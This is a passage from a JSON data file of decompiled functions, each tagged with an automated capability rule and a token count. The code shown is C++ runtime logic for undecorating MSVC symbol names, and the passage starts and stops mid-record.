var_18h = 0xe;\n        break;\n    case 0x55:\n        var_1ch = \"char32_t\";\ncode_r0x004363c7:\n        var_18h = 0x8;\n        break;\n    case 0x56:\n        var_1ch = \"this \";\n        var_18h = 0x5;\n        uVar2 = fcn.00438abf(&var_14h, arg_ch);\n        fcn.00434593(&var_1ch);\n        fcn.00434a09(&var_1ch, uVar2);\n        var_ch = var_1ch;\n        var_8h = var_18h;\n        goto code_r0x004365e3;\n    case 0x57:\n        var_1ch = \"wchar_t\";\n        goto code_r0x004365d0;\n    case 0x58:\n    case 0x59:\n        *0x6ccc1c = puVar3;\n        ppcVar1 = fcn.0043750e(&var_24h);\n        var_14h = *ppcVar1;\n        var_10h = ppcVar1[1];\n        var_ch = var_14h;\n        var_8h = var_10h;\n        if (var_14h == NULL) goto code_r0x004365bc;\n        goto code_r0x004365e3;\n    default:\ncode_r0x004365c9:\n        var_1ch = \"UNKNOWN\";\ncode_r0x004365d0:\n        var_18h = 0x7;\n    }\ncode_r0x004365d7:\n    fcn.0043486d(&var_1ch);\ncode_r0x004365e3:\n    if ((((var_1h == 0x45) || (var_1h == 0x47)) || (var_1h == 0x49)) || ((var_1h == 0x4b || (var_1h == 0x4d)))) {\ncode_r0x004365ff:\n        var_1ch = \"unsigned \";\n        var_18h = 0x9;\ncode_r0x0043660d:\n        fcn.00434593(&var_1ch);\n        fcn.00434a09(&var_1ch, &var_ch);\n        var_ch = var_1ch;\n        var_8h = var_18h;\n    }\ncode_r0x00436631:\n    if (*arg_ch != 0) {\n        uVar2 = fcn.0043499a(&var_24h, 0x20, arg_ch);\n        fcn.00434b03(uVar2);\n    }\n    *arg_8h = var_ch;\n    arg_8h[1] = var_8h;\n    return arg_8h;\n}\n",
        "token_count": 2819
    },
    "004367ce": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004367ce(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x6ccc1c == '\\0') {\n        uVar2 = 1;\n    }\n    else {\n        uVar1 = **0x6ccc1c - 0x41;\n        *0x6ccc1c = *0x6ccc1c + 1;\n        uVar2 = 2;\n        if (uVar1 < 0x17) {\n            var_8h = 0;\n            var_4h = 2;\n            if ((~(*0x6ccc24 >> 1) & 1) != 0) {\n                uVar1 = uVar1 & 0xfffffffe;\n                if (uVar1 < 0xd) {\n                    if (uVar1 == 0xc) {\n                        uVar2 = 7;\n                    }\n                    else if (uVar1 == 0) {\n                        uVar2 = 1;\n                    }\n                    else if (uVar1 == 2) {\n                        uVar2 = 2;\n                    }\n                    else if (uVar1 == 4) {\n                        uVar2 = 4;\n                    }\n                    else if (uVar1 == 6) {\n                        uVar2 = 3;\n                    }\n                    else {\n                        if (uVar1 != 8) goto code_r0x00436884;\n                        uVar2 = 5;\n                    }\n                }\n                else if (uVar1 == 0xe) {\n                    uVar2 = 8;\n                }\n                else if (uVar1 == 0x10) {\n                    uVar2 = 6;\n                }\n                else if (uVar1 == 0x12) {\n                    uVar2 = 9;\n                }\n                else if (uVar1 == 0x14) {\n                    uVar2 = 10;\n                }\n                else {\n                    if (uVar1 != 0x16) goto code_r0x00436884;\n                    uVar2 = 0xb;\n                }\n                _var_10h = fcn.00434d1b(uVar2);\n                fcn.0043486d(&var_10h);\n            }\ncode_r0x00436884:\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n    }\n    fcn.00434635(uVar2);\n    return arg_8h;\n}\n",
        "token_count": 586
    },
    "004368a3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** __cdecl fcn.004368a3(char **arg_8h, char **arg_ch, int32_t arg_10h, char **arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    uint *arg_8h_00;\n    char **ppcVar2;\n    uint *puVar3;\n    code **ppcVar4;\n    int32_t arg_8h_01;\n    uint uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    char *pcVar8;\n    ulong uVar9;\n    uint var_84h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    char *var_4ch;\n    char *var_48h;\n    char *var_44h;\n    char *var_40h;\n    char *var_3ch;\n    char *var_38h;\n    char *var_34h;\n    char *var_30h;\n    uint var_2ch;\n    char *var_24h;\n    char *var_20h;\n    char *var_19h;\n    char *var_14h;\n    char *var_dh;\n    char *var_8h;\n    uint var_1h;\n    \n    ppcVar2 = arg_14h;\n    var_19h._0_1_ = '\\0';\n    if (**0x6ccc1c == '\\0') {\n        if (arg_18h == 0) {\n            if (*arg_ch == NULL) {\n                arg_ch = arg_14h;\n                if (*arg_14h == NULL) goto code_r0x0043702e;\n            }\n            else if (((arg_ch[1] & 0x100) == 0) && (*arg_14h != NULL)) {\n                fcn.00434635(1);\n                fcn.00434a09(&var_4ch, ppcVar2);\n                fcn.00434a2b(&var_54h, 0x20);\n                fcn.00434a09(arg_8h, arg_ch);\n                return arg_8h;\n            }\n            fcn.004349c5(arg_8h, 1, arg_ch);\n            return arg_8h;\n        }\ncode_r0x0043702e:\n        uVar5 = 1;\ncode_r0x00437030:\n        fcn.00434635(uVar5);\n        return arg_8h;\n    }\n    if ((**0x6ccc1c != '$') || (fcn.004377c5(&var_3ch, &arg_10h, &var_19h, arg_18h),  var_3ch == NULL)) {\n        pcVar7 = NULL;\n        var_40h = NULL;\n        pcVar8 = NULL;\n        var_34h = NULL;\n        var_30h = NULL;\n        var_1h._0_1_ = '\\0';\n        var_dh._0_1_ = '\\0';\n        uVar6 = **0x6ccc1c - (((**0x6ccc1c < 'A') - 1 & 0x2b) + 0x16);\n        var_44h = NULL;\n        do {\n            if (uVar6 == 4) {\n                if ((~((*0x6ccc24 >> 0x10 | *0x6ccc24) >> 1) & 1) != 0) {\n                    uVar9 = fcn.00434d1b(0xc);\n                    if (pcVar7 == NULL) {\n                        puVar3 = &var_19h + 1;\ncode_r0x00436a9a:\n                        unique0x100012e8 = uVar9;\n                        fcn.0043486d(puVar3);\n                        pcVar7 = var_34h;\n                        pcVar8 = var_30h;\n                    }\n                    else {\n                        var_3ch = pcVar7;\n                        var_38h = pcVar8;\n                        _var_7ch = uVar9;\n                        fcn.00434b5a(0x20);\n                        puVar3 = &var_7ch;\n                        arg_8h_00 = &var_2ch;\ncode_r0x00436993:\n                        ppcVar2 = fcn.004349e7(arg_8h_00, puVar3);\n                        var_34h = *ppcVar2;\n                        var_30h = ppcVar2[1];\n                        pcVar7 = var_34h;\n                        pcVar8 = var_30h;\n                    }\n                }\n            }\n            else if (uVar6 == 5) {\n                if ((~(*0x6ccc24 >> 1) & 1) != 0) {\n                    if (var_44h == NULL) {\n                        uVar9 = fcn.00434d1b(0xe);\n                        _var_74h = uVar9;\n                        fcn.0043486d(&var_74h);\n                    }\n                    else {\n                        uVar9 = fcn.00434d1b(0xe);\n                        stack0xfffffff0 = var_44h;\n                        var_8h = var_40h;\n                        _var_6ch = uVar9;\n                        fcn.00434b5a(0x20);\n                        ppcVar2 = fcn.004349e7(&var_54h, &var_6ch);\n                        var_44h = *ppcVar2;\n                        var_40h = ppcVar2[1];\n                    }\n                }\n            }\n            else if (uVar6 == 6) {\n                if (arg_18h == 0) goto code_r0x00436fb6;\n                var_1h._0_1_ = '\\x01';\n            }\n            else if (uVar6 == 7) {\n                if (arg_18h == 0) goto code_r0x00436fb6;\n                var_dh._0_1_ = '\\x01';\n            }\n            else {\n                if (uVar6 != 8) {\n                    if (**0x6ccc1c != '\\0') {\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                    }\n                    if (uVar6 < 0x20) {\n                        unique0x00007a00 = *(arg_10h * 8 + 0x47d3b8);\n                        pcVar8 = *(arg_10h * 8 + 0x47d3bc);\n                        var_14h = pcVar8;\n                        fcn.00434593(&var_19h + 1);\n                        var_24h = NULL;\n                        var_20h = NULL;\n                        fcn.00434b03(&var_dh + 1);\n                        stack0xfffffff0 = var_24h;\n                        var_8h = var_20h;\n                        if (pcVar7 != NULL) {\n                            if (var_20h < '\\x02') {\n                                if (var_24h == NULL) {\n                                    var_24h = NULL;\n                                    var_20h = NULL;\n                                    fcn.00435abf(0x20);\n                                }\n                                else {\n                                    ppcVar4 = fcn.00437f77(8);\n                                    if (ppcVar4 == NULL) {\n                                        ppcVar4 = NULL;\n                                    }\n                                    else {\n                                        fcn.00434784();\n                                        *ppcVar4 = vtable.charNode.0;\n                                        *(ppcVar4 + 1) = 0x20;\n                                    }\n                                    fcn.00434220(ppcVar4);\n                                }\n                            }\n                            ppcVar2 = fcn.00434a09(&var_2ch, &var_34h);\n                            unique0x00007a00 = *ppcVar2;\n                            var_8h = ppcVar2[1];\n                        }\n                        if (var_44h != NULL) {\n                            var_3ch = var_44h;\n                            var_38h = var_40h;\n                            fcn.00434b5a(0x20);\n                            ppcVar2 = fcn.00434a09(&var_2ch, &var_dh + 1);\n                            unique0x00007a00 = *ppcVar2;\n                            var_8h = ppcVar2[1];\n                        }\n                        if ((uVar6 & 0x10) != 0) {\n                            if (arg_18h != 0) goto code_r0x00436fb6;\n                            if (pcVar8 < 1) {\n                                if (**0x6ccc1c != '\\0') {\n                                    uVar5 = fcn.004390fb(&var_2ch);\n                                    fcn.00434c93(uVar5);\n                                }\n                            }\n                            else {\n                                stack0xffffffe4 = 0x47da2c;\n                                var_14h = 0x2;\n                                fcn.00434593(&var_19h + 1);\n                                fcn.00434a09(&var_19h + 1, &var_dh + 1);\n                                stack0xfffffff0 = stack0xffffffe4;\n                                var_8h = var_14h;\n                                if (**0x6ccc1c == '\\0') {\n                                    fcn.00434635(1);\n                                    fcn.00434a09(&var_19h + 1, &var_dh + 1);\n                                    stack0xfffffff0 = stack0xffffffe4;\n                                    var_8h = var_14h;\n                                }\n                                else {\n                                    fcn.004390fb(&var_2ch);\n                                    ppcVar2 = fcn.00434a09(&var_54h, &var_dh + 1);\n                                    unique0x00007a00 = *ppcVar2;\n                                    var_8h = ppcVar2[1];\n                                }\n                            }\n                            cVar1 = **0x6ccc1c;\n                            if (cVar1 == '\\0') {\n                                if (var_8h < '\\x02') {\n                                    if (stack0xfffffff0 == NULL) {\n                                        fcn.00434903(1);\n                                    }\n                                    else {\n                                        fcn.004341df(0x47dfec);\n                                    }\n                                }\n                            }\n                            else {\n                                *0x6ccc1c = *0x6ccc1c + 1;\n                                if (cVar1 != '@') goto code_r0x00436fb6;\n                            }\n                        }\n                        if ((~(*0x6ccc24 >> 1) & 1) == 0) {\n                            if ((uVar6 & 0xc) == 0xc) {\n                                uVar5 = fcn.004360bf(&var_2ch);\n                                fcn.00434c93(uVar5);\n                            }\n                        }\n                        else if ((uVar6 & 0xc) == 0xc) {\n                            if (arg_18h != 0) goto code_r0x00436fb6;\n                            fcn.004360bf(&var_2ch);\n                            ppcVar2 = fcn.00434a09(&var_54h, &var_dh + 1);\n                            unique0x00007a00 = *ppcVar2;\n                            var_8h = ppcVar2[1];\n                        }\n                        if ((uVar6 & 2) != 0) {\n                            stack0xffffffe4 = \"volatile \";\n                            var_14h = 0x9;\n                            fcn.00434593(&var_19h + 1);\n                            fcn.00434a09(&var_19h + 1, &var_dh + 1);\n                            stack0xfffffff0 = stack0xffffffe4;\n                            var_8h = var_14h;\n                        }\n                        if ((uVar6 & 1) != 0) {\n                            stack0xffffffe4 = \"const \";\n                            var_14h = 0x6;\n                            fcn.00434593(&var_19h + 1);\n                            fcn.00434a09(&var_19h + 1, &var_dh + 1);\n                            stack0xfffffff0 = stack0xffffffe4;\n                            var_8h = var_14h;\n                        }\n                        if (var_1h != '\\0') {\n                            stack0xffffffe4 = 0x47de20;\n                            var_24h = stack0xfffffff0;\n                            var_20h = var_8h;\n                            var_14h = 0x2;\n                            if (var_8h < '\\x02') {\n                                if (stack0xfffffff0 == NULL) {\n                                    fcn.0043486d(&var_19h + 1);\n                                }\n                                else {\n                                    ppcVar4 = fcn.00437f77(0xc);\n                                    if (ppcVar4 == NULL) {\n                                        ppcVar4 = NULL;\n                                    }\n                                    else {\n                                        fcn.00434784();\n                                        *ppcVar4 = vtable.pcharNode.0;\n                                        ppcVar4[1] = 0x47de20;\n                                        ppcVar4[2] = 0x2;\n                                    }\n                                    fcn.004342a2(ppcVar4);\n                                }\n                            }\n                            stack0xfffffff0 = var_24h;\n                            var_8h = var_20h;\n                        }\n                        if (var_dh != '\\0') {\n                            stack0xffffffe4 = 0x47de24;\n                            var_14h = 0x3;\n                            var_24h = stack0xfffffff0;\n                            var_20h = var_8h;\n                            if (var_8h < '\\x02') {\n                                if (stack0xfffffff0 == NULL) {\n                                    fcn.0043486d(&var_19h + 1);\n                                }\n                                else {\n                                    ppcVar4 = fcn.00437f77(0xc);\n                                    if (ppcVar4 == NULL) {\n                                        ppcVar4 = NULL;\n                                    }\n                                    else {\n                                        fcn.00434784();\n                                        *ppcVar4 = vtable.pcharNode.0;\n                                        ppcVar4[1] = 0x47de24;\n                                        ppcVar4[2] = 0x3;\n                                    }\n                                    fcn.004342a2(ppcVar4);\n                                }\n                            }\n                            stack0xfffffff0 = var_24h;\n                            var_8h = var_20h;\n                        }\n                        pcVar8 = stack0xfffffff0;\n                        pcVar7 = var_8h;\n                        if (arg_18h != 0) goto code_r0x00436f95;\n                        if (*arg_ch == NULL) {\n                            arg_ch = arg_14h;\n                            if (*arg_14h == NULL) goto code_r0x00436f95;\ncode_r0x00436f2b:\n                            ppcVar2 = fcn.0043499a(&var_2ch, 0x20, arg_ch);\n                        }\n                        else {\n                            pcVar7 = arg_ch[1];\n                            if (((pcVar7 & 0x100) != 0) || (*arg_14h == NULL)) {\n                                pcVar8 = *arg_ch;\n                                if ((pcVar7 & 0x800) != 0) goto code_r0x00436f95;\n                                goto code_r0x00436f2b;\n                            }\n                            fcn.0043499a(&var_2ch, 0x20, arg_14h);\n                            fcn.00434a2b(&var_54h, 0x20);\n                            ppcVar2 = fcn.00434a09(&var_84h, arg_ch);\n                        }\n                        pcVar8 = stack0xfffffff0;\n                        pcVar7 = var_8h;\n                        if ('\\x01' < var_8h) goto code_r0x00436f95;\n                        pcVar8 = *ppcVar2;\n                        if (stack0xfffffff0 == NULL) {\n                            if (pcVar8 != NULL) {\n                                pcVar7 = ppcVar2[1];\n                                goto code_r0x00436f95;\n                            }\n                            arg_8h_01 = *(ppcVar2 + 1);\n                        }\n                        else {\n                            if (pcVar8 != NULL) {\n                                fcn.0043419e(pcVar8);\n                                pcVar8 = stack0xfffffff0;\n                                pcVar7 = var_8h;\n                                goto code_r0x00436f95;\n                            }\n                            arg_8h_01 = *(ppcVar2 + 1);\n                            pcVar8 = stack0xfffffff0;\n                            if (arg_8h_01 == 0) goto code_r0x00436f95;\n                            if ((arg_8h_01 != 2) && (arg_8h_01 != 3)) {\n                                uVar5 = fcn.0043acc3(arg_8h_01);\n                                fcn.004341df(uVar5);\n                                pcVar8 = stack0xfffffff0;\n                                pcVar7 = var_8h;\n                                goto code_r0x00436f95;\n                            }\n                        }\n                        fcn.00434903(arg_8h_01);\n                        pcVar8 = stack0xfffffff0;\n                        pcVar7 = var_8h;\ncode_r0x00436f95:\n                        var_8h = pcVar7;\n                        stack0xfffffff0 = pcVar8;\n                        pcVar7 = var_8h | 0x100;\n                        if (var_19h != '\\0') {\n                            pcVar7 = var_8h | 0x2100;\n                        }\n                        *arg_8h = stack0xfffffff0;\n                        arg_8h[1] = pcVar7;\n                        return arg_8h;\n                    }\ncode_r0x00436fb6:\n                    uVar5 = 2;\n                    goto code_r0x00437030;\n                }\n                if ((~(*0x6ccc24 >> 1) & 1) != 0) {\n                    uVar9 = fcn.00434d1b(0xd);\n                    if (pcVar7 == NULL) {\n                        puVar3 = &var_64h;\n                        _var_64h = uVar9;\n                        uVar9 = stack0xffffffe4;\n                        goto code_r0x00436a9a;\n                    }\n                    var_24h = pcVar7;\n                    var_20h = pcVar8;\n                    _var_5ch = uVar9;\n                    fcn.00434b5a(0x20);\n                    puVar3 = &var_5ch;\n                    arg_8h_00 = &var_84h;\n                    goto code_r0x00436993;\n                }\n            }\n            *0x6ccc1c = *0x6ccc1c + 1;\n            if (**0x6ccc1c == '$') {\n                fcn.004377c5(&var_4ch, &arg_10h, &var_19h, arg_18h);\n                if (var_4ch != NULL) goto code_r0x00436fba;\n            }\n            uVar6 = **0x6ccc1c - (((**0x6ccc1c < 'A') - 1 & 0x2b) + 0x16);\n        } while( true );\n    }\n    *arg_8h = var_3ch;\n    goto code_r0x004368ed;\ncode_r0x00436fba:\n    *arg_8h = var_4ch;\n    var_38h = var_48h;\ncode_r0x004368ed:\n    arg_8h[1] = var_38h;\n    return arg_8h;\n}\n",
        "token_count": 4454
    },
    "00437a93": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n\nuint * __cdecl fcn.00437a93(uint *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    uint *var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = **0x6ccc1c;\n    pcVar5 = *0x6ccc1c;\n    if (cVar1 == '\\0') {\ncode_r0x00437e25:\n        *0x6ccc1c = pcVar5;\n        fcn.004349c5(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if ((('5' < cVar1) && (cVar1 < ':')) || (cVar1 == '_')) {\n        uVar6 = cVar1 - 0x36;\n        pcVar5 = *0x6ccc1c + 1;\n        if (uVar6 == 0x29) {\n            if (*pcVar5 == '\\0') goto code_r0x00437e25;\n            uVar6 = *pcVar5 - 0x3d;\n            *0x6ccc1c = *0x6ccc1c + 2;\n            if ((uVar6 < 4) || (7 < uVar6)) {\n                uVar6 = 0xffffffff;\n            }\n        }\n        else {\n            *0x6ccc1c = pcVar5;\n            if ((uVar6 < 0) || (3 < uVar6)) goto code_r0x00437e21;\n        }\n        if (uVar6 != 0xffffffff) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = *arg_ch;\n            var_4h = arg_ch[1];\n            if ((uVar6 & 2) != 0) {\n                if (**0x6ccc1c == '@') {\n                    *0x6ccc1c = *0x6ccc1c + 1;\n                }\n                else {\n                    var_18h = 0x47da2c;\n                    var_14h = 2;\n                    fcn.00434593(&fcn.00437a93::var_18h);\n                    fcn.00434a09(&fcn.00437a93::var_18h, &fcn.00437a93::var_8h);\n                    var_8h = var_18h;\n                    var_4h = var_14h;\n                    if (**0x6ccc1c == '\\0') {\n                        fcn.00434635(1);\n                        fcn.00434a09(&fcn.00437a93::var_18h, &fcn.00437a93::var_8h);\n                        var_8h = var_18h;\n                        var_4h = var_14h;\n                    }\n                    else {\n                        uVar2 = fcn.004390fb(&fcn.00437a93::var_28h);\n                        fcn.0043499a(&fcn.00437a93::var_18h, 0x20, uVar2);\n                        piVar3 = fcn.00434a09(&fcn.00437a93::var_30h, &fcn.00437a93::var_8h);\n                        var_8h = *piVar3;\n                        var_4h = piVar3[1];\n                    }\n                }\n                if (**0x6ccc1c == '\\0') {\n                    fcn.00434635(1);\n                    fcn.00434a09(arg_8h, &fcn.00437a93::var_8h);\n                    return arg_8h;\n                }\n                if (**0x6ccc1c != '@') goto code_r0x00437e21;\n                *0x6ccc1c = *0x6ccc1c + 1;\n                if ((*0x6ccc24 & 0x60) == 0x60) {\n                    uVar2 = fcn.0043a0b9(&fcn.00437a93::var_30h);\n                    fcn.00434c93(uVar2);\n                }\n                else {\n                    puVar4 = fcn.0043a0b9(&fcn.00437a93::var_30h);\n                    var_10h = *puVar4;\n                    var_ch = puVar4[1];\n                }\n            }\n            if ((uVar6 & 4) != 0) {\n                if ((~(*0x6ccc24 >> 1) & 1) == 0) {\n                    var_30h = fcn.004360bf(&fcn.00437a93::var_30h);\n                    fcn.00434c93(var_30h);\n                }\n                else {\n                    uVar2 = fcn.004360bf(&fcn.00437a93::var_30h);\n                    fcn.0043499a(&fcn.00437a93::var_28h, 0x20, uVar2);\n                    var_30h = &fcn.00437a93::var_18h;\n                    piVar3 = fcn.00434a09(var_30h, &fcn.00437a93::var_8h);\n                    var_8h = *piVar3;\n                    var_4h = piVar3[1];\n                }\n            }\n            if ((~(*0x6ccc24 >> 1) & 1) == 0) {\n                uVar2 = fcn.004367ce(&fcn.00437a93::var_30h);\n                fcn.00434c93(uVar2);\n            }\n            else {\n                fcn.004367ce(&fcn.00437a93::var_30h);\n                piVar3 = fcn.00434a09(&fcn.00437a93::var_28h, &fcn.00437a93::var_28h);\n                var_8h = *piVar3;\n                var_4h = piVar3[1];\n            }\n            if (*arg_ch != 0) {\n                fcn.0043499a(&fcn.00437a93::var_30h, 0x28, &fcn.00437a93::var_8h);\n                piVar3 = fcn.00434a2b(&fcn.00437a93::var_28h, 0x29);\n                var_8h = *piVar3;\n                var_4h = piVar3[1];\n            }\n            piVar3 = fcn.00437f77(8);\n            if (piVar3 == NULL) {\n                piVar3 = NULL;\n            }\n            else {\n                *piVar3 = 0;\n                piVar3[1] = 0;\n            }\n            fcn.004390cc(&fcn.00437a93::var_20h, piVar3);\n            uVar2 = fcn.00435d1b(&fcn.00437a93::var_30h);\n            fcn.0043499a(&fcn.00437a93::var_28h, 0x28, uVar2);\n            fcn.00434a2b(&fcn.00437a93::var_18h, 0x29);\n            fcn.00434b03(0x437d5e);\n            if (((*0x6ccc24 & 0x60) != 0x60) && ((uVar6 & 2) != 0)) {\n                fcn.00434b03(&fcn.00437a93::var_10h);\n            }\n            if ((~(*0x6ccc24 >> 0x13) & 1) == 0) {\n                uVar2 = fcn.00438fa7(&fcn.00437a93::var_30h);\n                fcn.00434c93(uVar2);\n            }\n            else {\n                uVar2 = fcn.00438fa7(&fcn.00437a93::var_30h);\n                fcn.00434b03(uVar2);\n            }\n            uVar2 = fcn.00438001(&fcn.00437a93::var_30h);\n            fcn.00434b03(uVar2);\n            if ((~(*0x6ccc24 >> 8) & 1) == 0) {\n                uVar2 = fcn.0043a0e8(&fcn.00437a93::var_30h);\n                fcn.00434c93(uVar2);\n            }\n            else {\n                uVar2 = fcn.0043a0e8(&fcn.00437a93::var_30h);\n                fcn.00434b03(uVar2);\n            }\n            if (piVar3 != NULL) {\n                *piVar3 = var_8h;\n                piVar3[1] = var_4h;\n                *arg_8h = var_20h;\n                arg_8h[1] = var_1ch;\n                return arg_8h;\n            }\n            uVar2 = 3;\n            goto code_r0x00437e17;\n        }\n    }\ncode_r0x00437e21:\n    uVar2 = 2;\ncode_r0x00437e17:\n    fcn.00434635(uVar2);\n    return arg_8h;\n}\n",
        "token_count": 2169
    },
    "00438fa7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00438fa7(uint *arg_8h)\n\n{\n    char cVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((**0x6ccc1c != '\\0') && (**0x6ccc1c == '_')) {\n        cVar1 = (*0x6ccc1c)[1];\n        if ((cVar1 != '\\0') && (cVar1 < 'E')) {\n            uVar5 = (*0x6ccc1c)[1] - 0x41;\n            *0x6ccc1c = *0x6ccc1c + 2;\n            if (3 < uVar5) {\ncode_r0x004390ae:\n                fcn.00434635(2);\n                return arg_8h;\n            }\n            var_8h = 0;\n            var_4h = 0;\n            uVar2 = 0;\n            uVar3 = 0;\n            if ((~(*0x6ccc24 >> 1) & 1) != 0) {\n                fcn.00434b5a(0x20);\n                _var_10h = fcn.00434d1b(0xf);\n                fcn.00434aab(&var_10h);\n                if (uVar5 != 0) {\n                    while( true ) {\n                        uVar4 = -uVar5 & uVar5;\n                        if (uVar4 == 1) {\n                            var_18h = 0x47dce0;\n                            arg_8h_00 = &var_18h;\n                            var_14h = 3;\n                        }\n                        else {\n                            if (uVar4 != 2) goto code_r0x004390ae;\n                            arg_8h_00 = &var_10h;\n                            _var_10h = 0x30047dce4;\n                        }\n                        fcn.00434aab(arg_8h_00);\n                        uVar5 = uVar5 & ~uVar4;\n                        if (uVar5 == 0) break;\n                        var_20h = 0x47dce8;\n                        var_1ch = 2;\n                        fcn.00434aab(&var_20h);\n                    }\n                }\n                fcn.00434b5a(0x29);\n                uVar2 = var_8h;\n                uVar3 = var_4h;\n            }\n            arg_8h[1] = uVar3;\n            goto code_r0x004390c5;\n        }\n    }\n    uVar2 = 0;\n    arg_8h[1] = 0;\ncode_r0x004390c5:\n    *arg_8h = uVar2;\n    return arg_8h;\n}\n",
        "token_count": 688
    },
    "0043a10b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.0043a10b(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    bool bVar8;\n    \n    do {\n        uVar1 = 0;\n        if (**0x6ccc1c == 0x5f) {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            uVar1 = 0x4000;\n        }\n        uVar7 = **0x6ccc1c;\n        if (('@' < uVar7) && (uVar7 < '[')) {\n            uVar3 = uVar1 | 0x8000;\n            uVar6 = uVar7 - 0x41;\n            *0x6ccc1c = *0x6ccc1c + 1;\n            if ((uVar6 & 1) != 0) {\n                uVar3 = uVar1 | 0xa000;\n            }\n            if (0x17 < uVar6) {\n                return uVar3;\n            }\n            uVar1 = uVar3 | 0x800;\n            uVar4 = uVar6 & 0x18;\n            if (uVar4 == 0) {\n                uVar1 = uVar3 | 0x840;\n            }\n            else if (uVar4 == 8) {\n                uVar1 = uVar3 | 0x880;\n            }\n            else if (uVar4 != 0x10) {\n                return 0xffff;\n            }\n            uVar6 = uVar6 & 6;\n            if (uVar6 != 0) {\n                if (uVar6 == 2) {\n                    return uVar1 | 0x200;\n                }\n                if (uVar6 != 4) {\n                    if (uVar6 != 6) {\n                        return 0xffff;\n                    }\n                    return uVar1 | 0x400;\n                }\n                return uVar1 | 0x100;\n            }\n            return uVar1;\n        }\n        if (uVar7 != 0x24) {\n            if (uVar7 - 0x30 < 9) {\n                *0x6ccc1c = *0x6ccc1c + 1;\n    // switch table (9 cases) at 0x43a41f\n                switch(uVar7) {\n                case 0x30:\n                    return 0x800;\n                case 0x31:\n                    return 0x1000;\n                case 0x32:\n                    return 0;\n                case 0x33:\n                    return 0x4000;\n                case 0x34:\n                    return 0x2000;\n                case 0x35:\n                    return 0x6000;\n                case 0x36:\n                    return 0x6800;\n                case 0x37:\n                    return 0x7000;\n                case 0x38:\n                    return 0x7800;\n                default:\n                    return 0xffff;\n                }\n            }\n            if (uVar7 == 0x39) {\n                *0x6ccc1c = *0x6ccc1c + 1;\n                return 0xfffd;\n            }\n            if (uVar7 == 0x3b) {\n                *0x6ccc1c = *0x6ccc1c + 1;\n                return 0x6c00;\n            }\n            bVar8 = uVar7 != 0;\ncode_r0x0043a413:\n            return bVar8 + 0xfffe;\n        }\n        puVar5 = *0x6ccc1c + 1;\n        uVar7 = *puVar5;\n        if ('5' < uVar7) {\n            if (uVar7 == 0x41) {\n                uVar3 = uVar1 | 0x9000;\n                goto code_r0x0043a37a;\n            }\n            if (uVar7 == 0x42) {\n                uVar3 = uVar1 | 0x9800;\n                goto code_r0x0043a37a;\n            }\n            if (uVar7 == 0x43) {\n                uVar3 = 0x7c00;\n                goto code_r0x0043a37a;\n            }\n            if (uVar7 == 0x44) {\n                uVar3 = uVar1 | 0x9100;\n                goto code_r0x0043a37a;\n            }\n            if (uVar7 == 0x45) {\n                uVar3 = uVar1 | 0x9200;\n                goto code_r0x0043a37a;\n            }\n            if (uVar7 != 0x52) {\n                *0x6ccc1c = puVar5;\n                return 0xffff;\n            }\n            *0x6ccc1c = *0x6ccc1c + 2;\n            uVar7 = **0x6ccc1c;\n            if ((uVar7 < '0') || (iVar2 = 1,  puVar5 = *0x6ccc1c,  '5' < uVar7)) {\n                bVar8 = uVar7 == 0;\n                goto code_r0x0043a413;\n            }\ncode_r0x0043a312:\n            *0x6ccc1c = puVar5;\n            uVar1 = (iVar2 + 5) * 0x100 | uVar1;\n            uVar3 = uVar1 | 0x8800;\n            if ((uVar7 & 1) != 0) {\n                uVar3 = uVar1 | 0xa800;\n            }\n            uVar7 = uVar7 & 6;\n            puVar5 = *0x6ccc1c;\n            if (uVar7 == 0) {\n                uVar3 = uVar3 | 0x40;\n            }\n            else if (uVar7 == 2) {\n                uVar3 = uVar3 | 0x80;\n            }\n            else if (uVar7 != 4) {\n                return 0xffff;\n            }\ncode_r0x0043a37a:\n            *0x6ccc1c = puVar5 + 1;\n            return uVar3;\n        }\n        iVar2 = 0;\n        if (uVar7 == 0x35) goto code_r0x0043a312;\n        if (uVar7 == 0) {\n            uVar3 = 0xfffe;\n            puVar5 = *0x6ccc1c;\n            goto code_r0x0043a37a;\n        }\n        if (uVar7 != 0x24) {\n  